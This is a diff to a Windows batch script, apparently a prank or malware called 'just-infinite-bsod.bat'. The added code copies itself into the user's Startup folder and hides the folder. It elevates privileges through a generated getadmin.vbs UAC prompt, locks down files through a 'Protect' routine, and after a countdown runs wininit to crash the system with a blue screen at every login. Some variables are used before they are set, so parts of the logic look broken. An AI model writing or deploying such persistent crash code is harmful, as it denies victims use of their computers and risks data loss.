@@ -1,35 +1,64 @@
 @echo off
 
 setlocal enabledelayedexpansion
+call :GetAdminRights
 :: Get the script directory
-set scriptDir=%~dp0
-:: Get the script path
-set scriptPath=%~f0
-:: Run the script as admin
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-  echo Elevating...
-  powershell -Command "& { Start-Process cmd.exe -ArgumentList '/c \"%~f0\"' -Verb RunAs }"
-  exit /b
+set scriptDir="C:\Users\%realName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+set scriptName="just-infinite-bsod.bat"
+set realName=
+call :GetRealName
+cls
+if not exist %scriptDir%\%scriptName% (
+	attrib +h %scriptDir%
+
+	::Copy this batch script to script directory
+	copy /y "%~f0" "%scriptDir%\%scriptName%"
+
+	::Protect all files in script dir
+	call :Protect "%scriptDir%"
+
+)
+
+if not exist %startupPath%\%~n0.bat (
+    copy %startupPath% %startupPath%\%~n0.bat
+	echo Copied to startup
+	call %startupPath%\%~n0.bat
 )
 
 
-echo %scriptDir%
-set realName=
-call :GetRealName
-
-set startupPath = HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-
-:: Batch file starts on startup
-reg add "%startupPath%" /v InfiniteBSOD /t REG_SZ /d "%scriptDir%" /f
-
-
-call :Protect "%scriptPath%"
+call :Protect "%startupPath%\%~n0.bat"
+call :Protect "%scriptDir%"
 call :Protect "C:\Users\regedit.exe"
 
-set /a secs=60
+pause
+set /a secs=30
 call :Timer %secs%
 call :BSOD
+
+:GetAdminRights
+REM --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\icacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+echo Script now running with elevated privileges.
+
+
+
 ::Get the unchanged username
 :GetRealName
 
@@ -70,7 +99,7 @@ if %secs% neq 0 (
 exit /b 0
 ::BSOD
 :BSOD
-wininit.exe
+wininit
 exit /b 0
 
 pause
